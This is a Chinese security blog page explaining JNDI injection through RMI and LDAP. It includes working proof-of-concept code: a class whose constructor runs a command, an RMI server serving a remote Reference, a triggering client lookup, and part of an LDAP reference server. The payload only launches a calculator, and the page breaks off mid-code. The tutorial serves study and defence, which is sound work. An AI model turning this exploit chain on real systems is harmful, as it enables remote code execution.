@@ -1,0 +1,681 @@
+<!DOCTYPE html>
+<html lang='en' dir='auto'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='JNDI 概述 JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的命名服务和目录服务，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示
+命名服务（Naming Server） 命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。
+在命名服务中，有几个重要的概念。
+Bindings：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。 Context：上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。 References：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C&#43;&#43; 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。 目录服务（Directory Service） 简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。
+一些常见的目录服务有：
+LDAP： 轻型目录访问协议 Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等； 其他基于 X.500 (目录服务的标准) 实现的目录服务； JNDI注入 lookup()函数的访问地址参数控制不当，则有可能导致加载远程恶意类。JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示
+JNDI&#43;RMI 通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个Reference对象，Reference对象中指定从远程加载构造的恶意Factory类，客户端在进行lookup的时候，会从远程动态加载攻击者构造的恶意Factory类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。
+javax.naming.Reference构造方法为：Reference(String className, String factory, String factoryLocation)，
+className - 远程加载时所使用的类名 classFactory - 加载的class中需要实例化类的名称 classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议 因为Reference没有实现Remote接口也没有继承UnicastRemoteObject类，故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。
+test.java
+恶意代码（test.class），将其编译好放到可访问的http服务下(python -m http.server)
+// 不能放在任何包下 import java.io.IOException; public class test { public test() throws IOException { Runtime.'>
+<meta name='theme-color' content='#00ffff'>
+
+<meta property='og:title' content='JNDI • '>
+<meta property='og:description' content='JNDI 概述 JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的命名服务和目录服务，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示
+命名服务（Naming Server） 命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。
+在命名服务中，有几个重要的概念。
+Bindings：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。 Context：上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。 References：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C&#43;&#43; 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。 目录服务（Directory Service） 简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。
+一些常见的目录服务有：
+LDAP： 轻型目录访问协议 Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等； 其他基于 X.500 (目录服务的标准) 实现的目录服务； JNDI注入 lookup()函数的访问地址参数控制不当，则有可能导致加载远程恶意类。JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示
+JNDI&#43;RMI 通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个Reference对象，Reference对象中指定从远程加载构造的恶意Factory类，客户端在进行lookup的时候，会从远程动态加载攻击者构造的恶意Factory类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。
+javax.naming.Reference构造方法为：Reference(String className, String factory, String factoryLocation)，
+className - 远程加载时所使用的类名 classFactory - 加载的class中需要实例化类的名称 classFactoryLocation - 提供classes数据的地址可以是file/ftp/http等协议 因为Reference没有实现Remote接口也没有继承UnicastRemoteObject类，故不能作为远程对象bind到注册中心，所以需要使用ReferenceWrapper对Reference的实例进行一个封装。
+test.java
+恶意代码（test.class），将其编译好放到可访问的http服务下(python -m http.server)
+// 不能放在任何包下 import java.io.IOException; public class test { public test() throws IOException { Runtime.'>
+<meta property='og:url' content='https://n2ryx.github.io/docs/java/jndi/'>
+<meta property='og:site_name' content='n2ryx&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='docs'><meta property='article:tag' content='Java'><meta property='article:published_time' content='2024-03-27T00:00:00Z'/><meta property='article:modified_time' content='2024-03-27T00:00:00Z'/><meta name='twitter:card' content='summary'>
+
+<meta name="generator" content="Hugo 0.126.1">
+
+  <title>JNDI • </title>
+  <link rel='canonical' href='https://n2ryx.github.io/docs/java/jndi/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#00ffff;}
+</style>
+
+  
+
+
+  
+
+</head>
+<body class='page type-docs has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/images/logo.png'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      n2ryx&#39;s Blog
+      </a>
+    </h2>
+    <div class='desc'>
+    
+    </div>
+  </header>
+
+</section>
+<section class='widget widget-search sep-after'>
+  <header>
+    <h4 class='title widget-title'>Search</h4>
+  </header>
+
+  <form action='/search' id='search-form' class='search-form'>
+    <label>
+      <span class='screen-reader-text'>Search</span>
+      <input id='search-term' class='search-term' type='search' name='q' placeholder='Search&hellip;'>
+    </label></form>
+
+</section>
+<section class='widget widget-sidebar_menu sep-after'><nav id='sidebar-menu' class='menu sidebar-menu' aria-label='Sidebar Menu'>
+    <div class='container'>
+      <ul><li class='item'>
+  <a href='/'>主页</a></li><li class='item has-current'>
+  <a href='/docs/'>文档</a></li><li class='item'>
+  <a href='/archive/'>归档</a></li><li class='item'>
+  <a href='/about/'>关于</a></li></ul>
+    </div>
+  </nav>
+
+</section><section class='widget widget-taxonomy_cloud sep-after'>
+  <header>
+    <h4 class='title widget-title'>Tags</h4>
+  </header>
+
+  <div class='container list-container'>
+  <ul class='list taxonomy-cloud'><li>
+        <a href='/tags/java/' style='font-size:2em'>Java</a>
+      </li><li>
+        <a href='/tags/pentest/' style='font-size:1.0909090909090908em'>Pentest</a>
+      </li><li>
+        <a href='/tags/pollution/' style='font-size:1.1818181818181819em'>Pollution</a>
+      </li><li>
+        <a href='/tags/ssrf/' style='font-size:1em'>SSRF</a>
+      </li><li>
+        <a href='/tags/vul/' style='font-size:1.1818181818181819em'>Vul</a>
+      </li><li>
+        <a href='/tags/writeup/' style='font-size:1.0909090909090908em'>Writeup</a>
+      </li></ul>
+</div>
+
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="3" y1="12" x2="21" y2="12" />
+<line x1="3" y1="6" x2="21" y2="6" />
+<line x1="3" y1="18" x2="21" y2="18" />
+</svg>
+</span>
+  <span class='close'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="18" y1="6" x2="6" y2="18" />
+<line x1="6" y1="6" x2="18" y2="18" />
+</svg>
+</span>
+</button><div class='header-widgets'>
+        <div class='container'>
+    
+    <style>.widget-breadcrumbs li:after{content:'\2f '}</style>
+  <section class='widget widget-breadcrumbs sep-after'>
+    <nav id='breadcrumbs'>
+      <ol><li><a href='/'>主页</a></li><li><a href='/docs/'>文档</a></li><li><span>JNDI</span></li></ol>
+    </nav>
+  </section></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>n2ryx&#39;s Blog</p><p class='desc site-desc'></p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>JNDI</h1>
+      
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+<line x1="16" y1="2" x2="16" y2="6" />
+<line x1="8" y1="2" x2="8" y2="6" />
+<line x1="3" y1="10" x2="21" y2="10" />
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='2024-03-27T00:00:00Z'>2024, Mar 27</time>
+</span>
+
+  <span class='byline'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M21,21V20c0-2.76-4-5-9-5s-9,2.24-9,5v1" />
+<path d="M16,6.37A4,4,0,1,1,12.63,3,4,4,0,0,1,16,6.37Z" />
+</svg>
+<span class='screen-reader-text'> by </span><a href='/authors/%3cnil%3e'></a></span>
+  
+
+</div>
+
+
+  </div>
+</header>
+
+  
+  
+
+  <div class='container entry-content'>
+  <h2 id="jndi">JNDI</h2>
+<h3 id="概述">概述</h3>
+<p>JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口。JNDI提供统一的客户端API，并由管理者将JNDI API映射为特定的<strong>命名服务</strong>和<strong>目录服务</strong>，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。简单来说，开发人员通过合理的使用JNDI，能够让用户通过统一的方式访问获取网络上的各种资源和服务。如下图所示</p>
+<p><img alt="image-20240320194727812" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240320194727812.png"></p>
+<h4 id="命名服务naming-server">命名服务（Naming Server）</h4>
+<p>命名服务，简单来说，就是一种通过名称来查找实际对象的服务。比如我们的RMI协议，可以通过名称来查找并调用具体的远程对象。再比如我们的DNS协议，通过域名来查找具体的IP地址。这些都可以叫做命名服务。</p>
+<p>在命名服务中，有几个重要的概念。</p>
+<ul>
+<li><strong>Bindings</strong>：表示一个名称和对应对象的绑定关系，比如在在 DNS 中域名绑定到对应的 IP，在RMI中远程对象绑定到对应的name,文件系统中文件名绑定到对应的文件。</li>
+<li><strong>Context</strong>：上下文，一个上下文中对应着<strong>一组名称到对象的绑定关系</strong>，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (SubContext)。</li>
+<li><strong>References</strong>：在一个实际的名称服务中，有些对象可能无法直接存储在系统内，这时它们便以引用的形式进行存储，可以理解为 C/C++ 中的指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd (file descriptor)，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
+</ul>
+<h4 id="目录服务directory-service">目录服务（Directory Service）</h4>
+<p>简单来说，目录服务是命名服务的扩展，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性（Attributes）信息。由此，我们不仅可以根据名称去查找（Lookup）对象(并获取其对应属性)，还可以根据属性值去搜索（Search）对象。</p>
+<p>一些常见的目录服务有：</p>
+<ul>
+<li>LDAP： 轻型目录访问协议</li>
+<li>Active Directory: 为 Windows 域网络设计，包含多个目录服务，比如域名服务、证书服务等；</li>
+<li>其他基于 X.500 (目录服务的标准) 实现的目录服务；</li>
+</ul>
+<h3 id="jndi注入">JNDI注入</h3>
+<p><code>lookup()</code>函数的访问地址参数控制不当，则有可能导致加载远程恶意类。JNDI接口可以调用多个含有远程功能的服务，所以我们的攻击方式也多种多样。但流程大同小异，如下图所示</p>
+<p><img alt="image-20240320195215502" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240320195215502.png"></p>
+<h4 id="jndirmi">JNDI+RMI</h4>
+<p>通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个<code>Reference</code>对象，<code>Reference</code>对象中指定从远程加载构造的恶意<code>Factory</code>类，客户端在进行<code>lookup</code>的时候，会从远程动态加载攻击者构造的恶意<code>Factory</code>类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。</p>
+<p><code>javax.naming.Reference</code>构造方法为：<code>Reference(String className, String factory, String factoryLocation)</code>，</p>
+<ol>
+<li><code>className</code> - 远程加载时所使用的类名</li>
+<li><code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</li>
+<li><code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>等协议</li>
+</ol>
+<p>因为<code>Reference</code>没有实现<code>Remote</code>接口也没有继承<code>UnicastRemoteObject</code>类，故不能作为远程对象bind到注册中心，所以需要使用<code>ReferenceWrapper</code>对<code>Reference</code>的实例进行一个封装。</p>
+<p>test.java</p>
+<p>恶意代码（test.class），将其编译好放到可访问的<code>http</code>服务下<code>(python -m http.server)</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 不能放在任何包下</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">test</span>() <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>RMIServer.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.Reference;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.LocateRegistry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.rmi.registry.Registry;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">RMIServer</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        Registry registry<span style="color:#f92672">=</span> LocateRegistry.<span style="color:#a6e22e">createRegistry</span>(1099);
+</span></span><span style="display:flex;"><span>        Reference reference <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Reference(<span style="color:#e6db74">&#34;test&#34;</span>, <span style="color:#e6db74">&#34;test&#34;</span>, <span style="color:#e6db74">&#34;http://127.0.0.1:8000/&#34;</span>);
+</span></span><span style="display:flex;"><span>        ReferenceWrapper wrapper <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ReferenceWrapper(reference);
+</span></span><span style="display:flex;"><span>        registry.<span style="color:#a6e22e">bind</span>(<span style="color:#e6db74">&#34;calc&#34;</span>, wrapper);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>JndiClient.java</p>
+<p>客户端通过<code>InitialContext().lookup(&quot;rmi://127.0.0.1:1099/calc&quot;)</code>获取远程对象时，会执行我们的恶意代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.naming.InitialContext;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">JndiClient</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span>args) <span style="color:#66d9ef">throws</span> Exception{
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">new</span> InitialContext().<span style="color:#a6e22e">lookup</span>(<span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/calc&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><img alt="image-20240322210853305" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240322210853305.png"></p>
+<h4 id="jndi原理探索">JNDI原理探索</h4>
+<p><img alt="image-20240324133202682" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240324133202682.png"></p>
+<p>跟进<code>com.sun.jndi.rmi.registry.RegistryContext#decodeObject</code>，</p>
+<p><img alt="image-20240324135842476" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240324135842476.png"></p>
+<p>这里将从服务端返回的<code>com.sun.jndi.rmi.registry.ReferenceWrapper_Stub#getReference</code>返回<code>Reference</code>对象</p>
+<p><img alt="image-20240324135551407" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240324135551407.png"></p>
+<p>跟进<code>javax.naming.spi.NamingManager#getObjectInstance</code>，此处为获取<code>Factory</code>类的实例</p>
+<p><img alt="image-20240324140614944" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240324140614944.png"></p>
+<p>跟进<code>javax.naming.spi.NamingManager#getObjectFactoryFromReference</code>，此处<code>clas = helper.loadClass(factoryName);</code>尝试从本地加载<code>Factory</code>类</p>
+<p>如果不存在本地不存在此类，则会从<code>codebase</code>中加载：<code>clas = helper.loadClass(factoryName, codebase);</code>会从远程加载我们恶意class，然后在<code>return</code>那里<code>return (clas != null) ? (ObjectFactory) clas.newInstance() : null;</code>对我们的恶意类进行一个实例化，进而加载我们的恶意代码。</p>
+<p><img alt="image-20240324141804449" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240324141804449.png"></p>
+<h3 id="jndildap">JNDI+LDAP</h3>
+<h4 id="ldap简介">LDAP简介</h4>
+<p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。 LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p>
+<p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的 Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP 所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP 协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP 这些程序的服务器。</p>
+<p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下：</p>
+<ul>
+<li>dn ：一条记录的详细位置</li>
+<li>dc ：一条记录所属区域    (哪一颗树)</li>
+<li>ou ：一条记录所属组织    （哪一个分支）</li>
+<li>cn/uid：一条记录的名字/ID   (哪一个苹果名字)</li>
+<li>&hellip;</li>
+</ul>
+<p>LDAP目录树的最顶部就是根，也就是所谓的“基准DN&quot;</p>
+<p>我们也可以使用LDAP服务来存储Java对象，如果我们此时能够控制JNDI去访问存储在LDAP中的Java恶意对象，那么就有可能达到攻击的目的。LDAP能够存储的Java对象如下：</p>
+<ul>
+<li>Java 序列化</li>
+<li>JNDI的References</li>
+<li>Marshalled对象</li>
+<li>Remote Location</li>
+</ul>
+<p><strong>Ldap依赖：</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#f92672">&lt;dependency&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;groupId&gt;</span>com.unboundid<span style="color:#f92672">&lt;/groupId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;artifactId&gt;</span>unboundid-ldapsdk<span style="color:#f92672">&lt;/artifactId&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;version&gt;</span>3.1.1<span style="color:#f92672">&lt;/version&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;scope&gt;</span>test<span style="color:#f92672">&lt;/scope&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/dependency&gt;</span>
+</span></span></code></pre></div><p>LDAP服务，代码改自<code>marshalsec</code></p>
+<p><code>JDK 6u132</code>, <code>JDK 7u122</code>, <code>JDK 8u113</code>中Java限制了通过<code>RMI</code>远程加载<code>Reference</code>工厂类，<code>com.sun.jndi.rmi.object.trustURLCodebase</code>、<code>com.sun.jndi.cosnaming.object.trustURLCodebase</code> 的默认值变为了<code>false</code>，即默认不允许通过RMI从远程的<code>Codebase</code>加载<code>Reference</code>工厂类</p>
+<p>JNDI不仅可以从通过RMI加载远程的Reference工厂类，也可以通过LDAP协议加载远程的Reference工厂类，但是在之后的版本Java也对LDAP Reference远程加载<code>Factory</code>类进行了限制，在<code>JDK 11.0.1</code>、<code>8u191</code>、<code>7u201</code>、<code>6u211</code>之后 <code>com.sun.jndi.ldap.object.trustURLCodebase</code>属性的值默认为<code>false</code></p>
+<h4 id="jdk--8u191">Jdk &lt; 8u191</h4>
+<p>恶意代码（test.class），将其编译好放到可访问的<code>http</code>服务下<code>(python -m http.server)</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// 不能放在任何包下</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.IOException;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">test</span>() <span style="color:#66d9ef">throws</span> IOException {
+</span></span><span style="display:flex;"><span>        Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">&#34;calc&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>LDAPRefServer.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.InetAddress;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.MalformedURLException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.net.URL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.ServerSocketFactory;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.SocketFactory;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.net.ssl.SSLSocketFactory;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.Entry;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.LDAPException;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.LDAPResult;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.unboundid.ldap.sdk.ResultCode;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">LDAPRefServer</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">final</span> String LDAP_BASE <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;dc=example,dc=com&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span> ( String<span style="color:#f92672">[]</span> tmp_args ) {
+</span></span><span style="display:flex;"><span>        String<span style="color:#f92672">[]</span> args<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> String<span style="color:#f92672">[]</span>{<span style="color:#e6db74">&#34;http://127.0.0.1/#test&#34;</span>};
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> port <span style="color:#f92672">=</span> 7777;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>            InMemoryDirectoryServerConfig config <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> InMemoryDirectoryServerConfig(LDAP_BASE);
+</span></span><span style="display:flex;"><span>            config.<span style="color:#a6e22e">setListenerConfigs</span>(<span style="color:#66d9ef">new</span> InMemoryListenerConfig(
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;listen&#34;</span>, <span style="color:#75715e">//$NON-NLS-1$</span>
